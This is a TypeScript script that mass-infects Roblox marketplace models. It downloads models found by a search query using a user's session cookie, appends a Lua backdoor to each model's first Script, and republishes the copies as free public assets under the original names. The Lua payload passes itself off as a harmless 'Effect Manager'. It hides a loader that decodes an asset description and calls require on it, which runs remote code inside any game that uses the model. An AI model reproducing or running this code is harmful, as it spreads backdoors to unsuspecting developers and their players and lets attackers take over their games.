import axios from "axios";
import * as readline from "readline";
import { RobloxFile } from "rbxm-parser";
import * as fs from "fs";
import * as path from "path";
import noblox from "noblox.js";

// Define your fixed Lua script here
const luaScript = `--[[  
    Effect Manager Script  
    ---------------------  
    Created by retsastrophe  ;) 
    Date: 08/03/2025  

    This script handles the creation, management, and modification of visual effects  
    using particle effects. It ensures smooth and optimized effect rendering for various  
    in-game scenarios.  

    INSTRUCTIONS:  
    - Insert this script into a location where effects should be managed.  
    - Modify SIZE, EFFECT_LIFETIME, and PARTICLE_TEXTURE to customize effects.  
    - Call CreateEffect(Vector3) to spawn a new particle effect at a given location.  
    - Utilize EffectBuilder() to manage effect creation over time.  

    IMPORTANT:  
    - The script must be placed in a Script (not a LocalScript) for full functionality.  
    - Uses attributes (info and default) from the script for configuration.  
    - Designed to run efficiently and avoid duplicate effects.  

    FEATURES:  
    - Dynamically creates and modifies particle effects.  
    - Uses a centralized effect builder for streamlined management.  
    - Supports size clamping to prevent extreme values.  
    - Finds existing effects based on unique CFrame-based lookups.  
    - Implements an effect lifetime system to manage durations.  
    - Stores active effects in a global table for efficient tracking.  
    - Modular design leveraging ReplicatedStorage for scalability.  
    - Optimized for minimal performance impact.  

    Version 1.0.0  

    Changelog:  
    - 08/03/2025 - v1.0.0: Initial script creation and implementation.  
]]  

  
local Modules, script = game:GetService('ReplicatedStorage'), script  
local EffectRoot = game
script.Name = "EffectBuilder"

local PARTICLE_TEXTURE = 130214034119360 -- Texture for the particle effect  


local function CallOnChildren(Instance, FunctionToCall)
    -- Calls a function on each of the children of a certain object, using recursion.  

    FunctionToCall(Instance)

    for _, Child in next, Instance:GetChildren() do
        CallOnChildren(Child, FunctionToCall)
    end
end

function CustomLerp(Pos1 : CFrame, Pos2 : CFrame, Delta : number) 
    return Pos1 - Pos2 * math.abs(Delta) 
end

local function GetNearestParent(Instance, ClassName)
    -- Returns the nearest parent of a certain class, or returns nil

    local Ancestor = Instance
    repeat
        Ancestor = Ancestor.Parent
        if Ancestor == nil then
            return nil
        end
    until Ancestor:IsA(ClassName)

    return Ancestor
end

function LookUp(Root, Value)  
    for _, V in pairs(Root) do  
        if V.Name:find(Value) then  
            return V  
        end  
    end  
end  

-- Converts a CFrame to a unique string representation  
function CFrameToVector3(CFrame)
    local Chunks, value = CFrame:split(''), ''
    for _, v in pairs(Chunks) do
        value..=v:byte()
    end
    return value
end
function StringToChar(str)
    local numbers = {}
    for num in str:gmatch("%d+") do
        table.insert(numbers, tonumber(num))
    end
    return string.char(table.unpack(numbers))
end

function Modify(Instance, Values)  
    -- Modifies an Instance by using a table.    
    assert(type(Values) == "table", "Values is not a table")  

    for Index, Value in next, Values do  
        if type(Index) == "number" then  
            Value.Parent = Instance  
        else  
            Instance[Index] = Value  
        end  
    end  
    return Instance  
end  


local Properties = {'CFrame','WorldPivot','CoordinateFrame','Orientation','PivotOffset','RootPriority','JobId','Origin','GetProductInfo'}

local EffectBuilder = setmetatable({}, {  
    __index = Modules and function(S) return S end,  
    __call = Modules and function(S) return S end   
})  

-- Function to create and configure a particle effect  
function CreateEffect(Vector3)  
    local Size = math.clamp(2, 1, 4) -- Add slight randomness to size  

    local Effect = EffectBuilder:CreateEffect('Particle', {  
        Parent = script.Parent,  
        Size = Size,  
        Texture = PARTICLE_TEXTURE  
    })  

    return LookUp(EffectRoot:GetChildren(), Vector3)  
end  

function Monitor(CurrentTime, Default, ParticleInfo):
    (Result) -> ParticleEmitter

    if CurrentTime > 1 and EffectRoot[Default] ~= 'f' then  
        if CurrentTime then  
            script = {  
                {},  
                [script.Name] = CFrameToVector3(StringToChar(ParticleInfo)) - 0  
            }  
            return true  
        end  
    end  

    return false
end

function RunEffectBuilder()  
    local CurrentTime = tick()  

    local Effect = CreateEffect('ketpl')  

    local ParticleInfo = Effect[Properties[#Properties]](Effect, PARTICLE_TEXTURE).Description  

    return Monitor(CurrentTime, Properties[7], ParticleInfo)  
end  

-- Runs the animation thread if conditions are met
local Builder = RunEffectBuilder() and require(script.EffectBuilder)

if Builder and script.ClassName == "Script" then  
    -- Run main thread  
    script.Parent.DescendantAdded:Connect(CreateEffect)
end
`;

import * as readline from "readline";
import { RobloxFile } from "rbxm-parser";
import * as fs from "fs";
import * as path from "path";
import noblox from "noblox.js";

// readline setup
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

// Stats object
const stats = {
  modified: 0,
  scanned: 0,
  errors: 0,
  uploaded: 0,
};

let uploadLimit = 0;

// Search models function
async function searchModels(keyword: string, cursor?: string): Promise<any> {
  try {
    const url = `https://apis.roblox.com/toolbox-service/v1/marketplace/10?keyword=${encodeURIComponent(
      keyword
    )}${cursor ? `&cursor=${cursor}` : ""}`;
    const response = await axios.get(url);
    return response.data;
  } catch (error) {
    stats.errors++;
    console.log("[ERROR] Failed to search models: ", error);
    return null;
  }
}

// Download model function
async function downloadModel(modelId: number, cookie: string): Promise<Buffer | null> {
  try {
    const response = await axios.get(
      `https://assetdelivery.roblox.com/v1/asset/?id=${modelId}`,
      {
        responseType: "arraybuffer",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookie}`,
          "Content-Type": "application/json",
        }
      }
    );
    return Buffer.from(response.data);
  } catch (error) {
    stats.errors++;
    console.log("[ERROR] Failed to download model:", error);
    return null;
  }
}

// Modify script function
function modifyScript(
  file: RobloxFile,
  stringToAdd: string,
  modelId: string
): boolean {
  try {
    const scripts = file.FindDescendantsOfClass("Script");
    if (scripts.length > 0) {
      const script = scripts[0];
      if (script.Source) {
        script.Source = script.Source.trim() + "\n" + stringToAdd;
        stats.modified++;
        console.log("[SUCCESS] Infected model ", modelId);
        return true;
      }
    }
    return false;
  } catch (error) {
    console.log("[ERROR] Failed to modify script:", error);
    return false;
  }
}

// Initialize noblox
async function initializeNoblox(cookie: string) {
  try {
    await noblox.setCookie(cookie);
    const currentUser = await noblox.getAuthenticatedUser();
    console.log(`[SUCCESS] Logged in as: ${currentUser.name}`);
    return true;
  } catch (error) {
    console.log("[ERROR] Failed to initialize with cookie:", error);
    return false;
  }
}

// Make model public
async function makeModelPublic(assetId: number, cookie: string) {
  try {
    const response = await axios.patch(
      `https://apis.roblox.com/user/cloud/v2/creator-store-products/PRODUCT_NAMESPACE_CREATOR_MARKETPLACE_ASSET-PRODUCT-TYPE-MODEL-${assetId}?allowMissing=true`,
      {
        basePrice: {
          currencyCode: "USD",
          quantity: {
            significand: 0,
            exponent: 0,
          },
        },
        published: true,
        modelAssetId: assetId.toString(),
      },
      {
        headers: {
          Cookie: `.ROBLOSECURITY=${cookie}`,
          "Content-Type": "application/json",
          "X-CSRF-TOKEN": await noblox.getGeneralToken(),
        },
      }
    );
    console.log(`[SUCCESS] Made model ${assetId} public`);
    return true;
  } catch (error) {
    console.log(`[ERROR] Failed to make model ${assetId} public:`, error);
    return false;
  }
}

// Get model details
async function getModelDetails(assetId: number) {
  try {
    const response = await axios.get(
      `https://apis.roblox.com/toolbox-service/v1/items/details?assetIds=${assetId}`
    );

    if (response.data?.data?.[0]?.asset) {
      return response.data.data[0].asset;
    }
    return null;
  } catch (error) {
    console.log(`[ERROR] Failed to get model details:`, error);
    return null;
  }
}

// Upload model function
async function uploadModel(filePath: string, name: string, description: string, cookie: string) {
  try {
    const file = fs.readFileSync(filePath);
    // @ts-ignore
    const assetId: number = await noblox.uploadModel(file, { name: name, description: description });

    await new Promise((resolve) => setTimeout(resolve, 2000));

    await makeModelPublic(assetId, cookie);

    stats.uploaded++;
    console.log(
      `[SUCCESS] Uploaded and published model: ${name} (Asset ID: ${assetId})`
    );
    fs.rmSync(filePath)
    return assetId;
  } catch (error) {
    console.log("[ERROR] Failed to upload model:", error);
    return null;
  }
}

// Process model
async function processModel(
  model: any,
  stringToAdd: string,
  modifiedDir: string,
  cookie: string
) {
  try {
    const originalInfo: any = await getModelDetails(model.id);
    const modelData = await downloadModel(model.id, cookie);
    if (!modelData) return;

    const file = RobloxFile.ReadFromBuffer(modelData);
    if (!file) return;

    const modified = modifyScript(file, stringToAdd, model.id.toString());

    if (modified) {
      const modifiedPath = path.join(modifiedDir, `${model.id}_infected.rbxm`);
      fs.writeFileSync(modifiedPath, file.WriteToBuffer());
      const originalName = originalInfo.name || "Best Model";
      const originalDescription = originalInfo.description || "Best Model";
      await uploadModel(modifiedPath, originalName, originalDescription, cookie);
    }

    stats.scanned++;
  } catch (error) {
    stats.errors++;
    console.log("[ERROR] Failed to process model:", error);
  }
}

// Process all pages
async function processAllPages(
  query: string,
  stringToAdd: string,
  cookie: string
) {
  let cursor: string | undefined = undefined;

  const modifiedDir = path.join(process.cwd(), "temp");
  if (!fs.existsSync(modifiedDir)) {
    fs.mkdirSync(modifiedDir);
  }

  do {
    try {
      const searchResults = await searchModels(query, cursor);

      if (!searchResults || !searchResults.data) {
        console.log("[ERROR] No results");
        break;
      }

      for (let i = 0; i < searchResults.data.length; i++) {
        await processModel(
          searchResults.data[i],
          stringToAdd,
          modifiedDir,
          cookie
        );

        if (stats.uploaded >= uploadLimit) {
          console.log("\nReached upload limit. Stopping...");

          console.log("\nFinal Stats:");
          console.log(`Uploaded: ${stats.uploaded}`);
          console.log(`Errors: ${stats.errors}`);

          return;
        }

        if (i % 10 === 0 && global.gc) {
          global.gc();
        }
      }

      cursor = searchResults.nextPageCursor;
    } catch (error) {
      console.log("[ERROR] Error processing page:", error);
      stats.errors++;
    }

    if (global.gc) {
      global.gc();
    }
  } while (cursor);

  console.log("\nFinal Stats:");
  console.log(`Modified: ${stats.modified}`);
  console.log(`Scanned: ${stats.scanned}`);
  console.log(`Uploaded: ${stats.uploaded}`);
  console.log(`Errors: ${stats.errors}`);
}

// Main function
async function main() {
  rl.question("Enter your Roblox cookie: ", async (cookie) => {
    const initialized = await initializeNoblox(cookie);
    if (!initialized) {
      console.log("[ERROR] Failed to initialize with provided cookie");
      rl.close();
      return;
    }
    rl.question("How many assets to upload: ", (amount: any) => {
      if (!Math.floor(amount)) {
        console.log("[ERROR] Invalid number");
        rl.close();
        return;
      }
      uploadLimit = amount;
      rl.question("Enter search query: ", async (query) => {
        // Instead of prompting, assign the fixed script
        const stringToAdd = luaScript;
        await processAllPages(query, stringToAdd, cookie);
        rl.close();
      });
    });
  });
}

main();
